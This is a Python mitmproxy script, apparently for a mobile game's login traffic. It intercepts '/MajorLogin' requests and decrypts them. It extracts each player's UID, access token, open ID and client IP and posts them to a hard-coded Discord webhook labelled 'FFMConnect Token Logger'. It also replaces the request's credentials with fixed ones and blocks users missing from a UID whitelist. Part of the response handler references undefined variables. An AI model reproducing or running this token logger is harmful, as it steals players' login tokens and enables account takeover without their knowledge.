from mitmproxy import http
import json
import asyncio
import aiohttp
from crypto.encryption_utils import aes_decrypt, encrypt_api
from protocols.protobuf_utils import get_available_room, CrEaTe_ProTo
import copy
import time

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1443537091152842783/uDHEHBhmsHvqiJ6p5mqPaXxrhRNd5iEp4r9ZoxbxLBZP5a_om74ze5mG4iDhnZ51Bs5r"

MOBILE_PROTO = "6326c9c1859ce2b339f77897132701cf550c24c535eb0c6304eabd1ec0c3b8f48b21909d48d30fc1ddf1b1bd3864fee24b4b36b13585439eb880865c32821aca23a2a8b128b251d8215ae9dba719125708bd480439c49e639d946bc7c50a226f68574ac1b9af2edc357d3f0b5dcf0fa63f5b12f59f18424b6037b36de1200a964eccf5e9569f1b3fa8e832f9b3e65008cafa0a1e4d7f30bb458fa2ce7f60d7823e66468652bf1e789d70fbeb4fe244493faf9b1794779e9104d5542708c3e35d2d99d8a12c2c2732c4002fd464a073ed841528d0f5afde0dab83daf69338d43796633bb0dc075bfb76398878cf561d06b898f8190144bc45c9928706abcfd9c3b6cdabc11429f1c44f985fb7be438f60ca4b59e846a890d8de003789fdc581297b1618ae9d4980bc474032af82fcab135830fbe931a0484d20a308305709790c59e4228801ef730d4c96e517dce0c1ef9036516f9e5642d46c2fe92257af2f1941925983378bd6dd7e2321c466fe72638906b8d7e81e673869e8a945db35b02c2270b26882bd85a5e4c6b882847379a8ef9e7483f284b74dbb337d09c6778b24232d48b3ccb6a5966502c9de5907321fd423dde35436f24b0bace6f82c0f0756cec59cd954255eca6e08023696e639e4347292f785e88e2cb92b20591caccd251da7839dc8340dcf933a5309151e2a0f001652e64fa4cada9ea1feaa31082d5f4bfda58fc5d31dd0864b7c9f5e473cba4d885d3fd90f08c0e06310b864e6cbfcf4a660308785f0ab1418995f6e5391cfa93f3e312afe7e561bfeaad0c7daa3083077027d451a19722832cee0d9ab8303ccc047ce693a1f598b65a0ce0a0cff2414274cb1b787218a1499abe4859a07c5ab303ca3ef687ba072016b438778b351a753c6369e82fb8cd8a82389ba2d96c40b940d3ba511e1b8c8ebad8e19b16d0ef321b9123ea0e140a0e772beeb5cf788d67573bfa0f601082f365c6cc14bb7c28ed92b1138436ac13835d132f03aaa7cb9869e10157251c631b5aa0fa54e49f781fcc28ee0e738c092c68f8f61fd9cfbf17c508a55eaacc73ee502ce0bbdccba22becf34a862e47e943c055f8fd9d46463c13d06a000daf73d94143e9599fee50ee44b4d0efb9c537b13267a05a8e1c0"


decrypted_bytes = aes_decrypt(MOBILE_PROTO)
decrypted_hex = decrypted_bytes.hex()
proto_json = get_available_room(decrypted_hex)
proto_fields = json.loads(proto_json)
proto_template = copy.deepcopy(proto_fields)

WHITELIST_PATH = "whitelist.json"

def load_whitelist():
    try:
        with open(WHITELIST_PATH, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def is_uid_whitelisted(uid_str):
    try:
        wl = load_whitelist()
        now = int(time.time())
        print(f"Whitelist check - UID: {uid_str}, Current time: {now}, Whitelist: {wl}")
        
        if str(uid_str) in wl:
            expiry = int(wl[str(uid_str)])
            print(f"UID {uid_str} found in whitelist. Expiry: {expiry}, Time left: {expiry - now} seconds")
            return expiry > now
        else:
            print(f"UID {uid_str} NOT found in whitelist")
            return False
    except Exception as e:
        print(f"Error checking whitelist: {e}")
        return False

async def send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip=None):
    embed = {
        "title": "🎫 FFMConnect Login Detected",
        "color": 0x2ECC71,
        "fields": [
            {"name": "UID", "value": str(uid), "inline": False},
            {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
            {"name": "Open ID", "value": f"`{open_id}`", "inline": False},
            {"name": "Main Active Platform", "value": str(main_active_platform), "inline": False}
        ],
        "footer": {
            "text": "FFMConnect Token Logger"
        }
    }
    
    if client_ip:
        embed["fields"].append({"name": "Client IP", "value": client_ip, "inline": False})
    
    data = {
        "embeds": [embed]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(DISCORD_WEBHOOK_URL, json=data) as resp:
                await resp.text()
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def run_async_task(coro):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(coro)
        else:
            loop.run_until_complete(coro)
    except RuntimeError:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        new_loop.run_until_complete(coro)

def get_client_ip(flow: http.HTTPFlow) -> str:
    """Get client IP address"""
    if hasattr(flow.client_conn, 'address') and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            request_bytes = flow.request.content
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)
            
            print("Original MajorLogin Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))
            
            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break
            
            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])
            
            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])
            
            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            
            print(f"Extracted from MajorLogin:")
            print(f"  UID: {uid}")
            print(f"  Access Token: {access_token}")
            print(f"  Open ID: {open_id}")
            print(f"  Main Active Platform: {main_active_platform}")
            
            if access_token and open_id:
                client_ip = get_client_ip(flow)
                print(f"Sending to Discord: UID={uid}, Token={access_token[:20]}..., OpenID={open_id}")
                run_async_task(send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip))
            
            print("\n=== MODIFYING MAJORLOGIN REQUEST ===")
            
            modified_proto = copy.deepcopy(proto_template)
            
            if "29" in modified_proto and isinstance(modified_proto["29"], dict):
                modified_proto["29"]["data"] = "e9c029ddccca925c83d3797760a4d9307d0967bfc3724c244ec1686fbcc60bc2"
                print(f"Updated field 29 (access_token): {modified_proto['29']['data'][:20]}...")
            
            if "22" in modified_proto and isinstance(modified_proto["22"], dict):
                modified_proto["22"]["data"] = "d945664c80fd8478208c48119d5313a4"
                print(f"Updated field 22 (open_id): {modified_proto['22']['data']}")
            
            if main_active_platform:
                if "99" in modified_proto and isinstance(modified_proto["99"], dict):
                    modified_proto["99"]["data"] = 3
                else:
                    modified_proto["99"] = {"wire_type": "varint", "data": int(main_active_platform)}
                
                if "100" in modified_proto and isinstance(modified_proto["100"], dict):
                    modified_proto["100"]["data"] = 3
                else:
                    modified_proto["100"] = {"wire_type": "varint", "data": int(main_active_platform)}
                print(f"Updated fields 99/100 (main_active_platform): {main_active_platform}")
            
            print("Modified Request Fields:")
            print(f"  Field 29: {modified_proto.get('29', {}).get('data', 'NOT_FOUND')[:20]}...")
            print(f"  Field 22: {modified_proto.get('22', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 99: {modified_proto.get('99', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 100: {modified_proto.get('100', {}).get('data', 'NOT_FOUND')}")
            
            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted MajorLogin request")
                
        except Exception as e:
            print(f"Error processing MajorLogin request: {e}")

def response(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            resp_bytes = flow.response.content
            resp_hex = resp_bytes.hex()
            proto_json = get_available_room(resp_hex)
            proto_fields = json.loads(proto_json)
            
            uid_from_response = None
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid_from_response = potential_uid
                        print(f"Found UID in response field {field_num}: {uid_from_response}")
                        break
            status_color = "[FF0000]"
            uid_color = "[FF0000]"
            if uid_from_response is not None:
                if not is_uid_whitelisted(uid_from_response):
                    flow.response.content = (
                        f"[FF0000]⧉───────────────────────────────────────────────⧉\n"
                        f"[FF4444]⟡  SYSTEM  : [FFD700]BYTE FORCE UID VERIFICATION MODULE\n"
                        f"[FF4444]⟡  TIME    : [AAAAAA]{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}\n"
                        f"[FF4444]⟡  UID     : {uid_color}{uid_from_response}\n"
                        f"[FF4444]⟡  STATUS  : {status_color}NOT AUTHORIZED\n"
                        f"[FF0000]⧉───────────────────────────────────────────────⧉\n"
                    ).encode()

                    flow.response.status_code = 500
                    embed = {
                        "title": "🎫 FFMConnect Login Detected",
                        "color": 0x2ECC71,
                        "fields": [
                            {"name": "UID", "value": str(uid), "inline": False},
                            {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
                            {"name": "Open ID", "value": f"`{open_id}`", "inline": False},
                            {"name": "Main Active Platform", "value": str(main_active_platform), "inline": False}
                        ],
                        "footer": {
                            "text": "FFMConnect Token Logger"
                        }
                    }
                    return
                else:
                    print(f"UID {uid_from_response} is authorized")
            else:
                print("No UID found in MajorLogin response")

        except Exception as e:
            print(f"Error processing MajorLogin response: {e}")